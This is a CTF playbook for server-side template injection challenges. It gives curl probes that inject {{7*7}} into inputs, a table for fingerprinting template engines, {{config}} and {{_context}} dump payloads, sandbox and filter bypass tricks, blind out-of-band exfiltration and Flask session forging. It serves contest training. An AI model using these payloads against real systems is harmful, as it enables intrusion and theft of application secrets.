# Field manual — the minute-by-minute playbook

A contest-run for a suspected-SSTI challenge. Order matters —
each step closes an ambiguity cheaply.

---

## Minutes 0–2 — recon

```bash
curl -si TARGET/                    # headers → stack
# Server: / X-Powered-By: / Set-Cookie: names the engine-family
curl -si TARGET/anything            # 404-page — engine in error?
```

Stack → engine table (see `ctf-shapes.md` §12). Record the guess.

## Minutes 2–5 — find the render-point

```bash
# every input gets {{7*7}}:
curl 'TARGET/?name={{7*7}}'
curl 'TARGET/?q={{7*7}}'
curl 'TARGET/{{7*7}}'               # path-segment
curl -X POST TARGET/form -d 'x={{7*7}}'
curl -H 'User-Agent: {{7*7}}' TARGET/   # headers → logs
python3 tools/web/variant_matrix.py --url TARGET --param name
```

`variant_matrix` covers the shape-sweep if manual probing is thin.

## Minutes 5–8 — fingerprint

```text
49 on {{7*7}}? → {{7*'7'}} → 7777777 = python, 49 = php-family
{{'a'+'b'}}    → 'ab' python, '0' twig — the sharp split
{{config}}     → config-dict → flask+jinja — done fingerprinting
${7*7}         → 49 → java/groovy/el-family
<%=7*7%>       → 49 → ejs/erb
```

## Minutes 8–15 — exploit

The first-10-probes table in `workflow.md` — but the two highest-
yield probes come FIRST:

```text
{{config}}                    — config-keys — flag often there
{{_context}} / {{_context|keys}} — every bound var — the inventory
```

Then the engine's exec/read chain — `chains.md` §10 selects it.

## Minutes 15–30 — the common stalls

| Stall | Do |
|---|---|
| `{{7*7}}` literal | stored-render? → polyglot + trigger-render |
| Eval works, attrs blocked | jinja-sandbox → `|attr`/`request.args` |
| `__` filtered | `\x5f\x5f`/dict-keys/`request.args` carriers |
| Quotes filtered | `dict(k=v)` keys / `'%c'|format(N)` / params |
| Blind — no output | write-to-webroot → OOB-listener → time-oracle |
| `.class` blocked | `$class.inspect` / bound-beans / `?api` |
| map/filter blocked | twig-version — `_self.env` chain or `_context` |

## The 30-minute rule

If no impact at 30 min: park SSTI, try the alternate class —
format-string (`{x}` probes), log4j-adjacent (`${jndi:}`),
XPATH-injection, or the input may reach an engine only via
stored-render — escalate per `decide.py`.

## Evidence discipline

```bash
python3 tools/web/http_probe.py --url 'TARGET/?name={{7*7}}' \
    --challenge <name>
   → response shows 49 → the emitted post-probe command records it
python3 tools/web/http_probe.py --url 'TARGET/?name={{config}}' \
    --challenge <name>
   → the config-dump → flag excerpt → post-probe confirms
```

The `49`/`flag{` bytes in the response ARE the verbatim excerpt —
`hooks.py` requires evidence-as-substring-of-response.

## Contest-mode shortcuts

- `ssti_probe` runs the fingerprint pass in one command — use it
  before hand-rolling the engine matrix
- `variant_matrix --dry-run` prints the shape-matrix — decide
  without spending requests
- `oob_listener` must be UP before firing blind-exfil payloads
- `pdf_text` for artifact-renders — the response isn't HTML
- `session_dissect` the second `config.SECRET_KEY` leaks —
  flask-session forge is the common endgame
